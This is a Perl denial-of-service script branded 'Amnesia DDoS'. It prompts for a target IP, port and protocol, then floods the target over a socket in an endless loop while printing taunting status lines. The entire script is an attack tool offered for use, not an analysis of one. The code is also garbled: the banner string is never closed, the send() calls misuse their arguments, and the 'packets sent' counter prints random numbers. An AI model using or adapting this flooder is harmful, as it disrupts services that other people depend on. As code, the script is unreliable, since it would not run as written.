#!/usr/bin/perl
 
use IO::Socket; 
 
###
# Amnesia DDoS Script
###
system("clear || cls");
#It forgets... 
print q{
_____         _____  _  __          _____
  / ____|  /\   |  __ \| |/ /    /\   |  __ \
 | (___   /  \  | |__) | ' /    /  \  | |__) |
  \___ \ / /\ \ |  _  /|  <    / /\ \ |  _  /
  ____) / ____ \| | \ \| . \  / ____ \| | \ \
 |_____/_/    \_\_|  \_\_|\_\/_/    \_\_|  \_\
print "\n------------------------------";
print "\n The IP you want to hit with Amnesia:";
chop ($host = <stdin>);
print "===============================";
print "\n The Port that'll forget: "; 
chop ($port = <stdin>);
print "===============================";
print "\n The Protocol (TCP or UDP):";
chop ($proto = <stdin>);
system("clear || cls");
print "\n[*][$host] Is being hit with Amnesia on port [$port] via proto => [$proto] Protocol\n\n";
sleep 1;
 
{
$sock = IO::Socket::INET->new (
	PeerAddr => $host,
	PeerPort => $port,
	Proto => "$proto" ) || die "\n [$host] Will now forget";
 
 
}
packets:
while (1) {
$size = rand() * 8921811 * 99919998;
print ("  Packets sent: $size\n");
send($sock, 999999999999999999999999999, $size); 
packets2:
$size = rand() * 8921873 * 99919988 * 2;
print "Forgetting:";
send($sock, 999999999999999999999999999, $size);
packet3:
$size = rand() * 8921873 * 99919988 * 2 + 99919988;
print " (=>$host:$port~$proto<=)";
send($sock, $size, $size); 
 
}
 
 
 
 
 
 
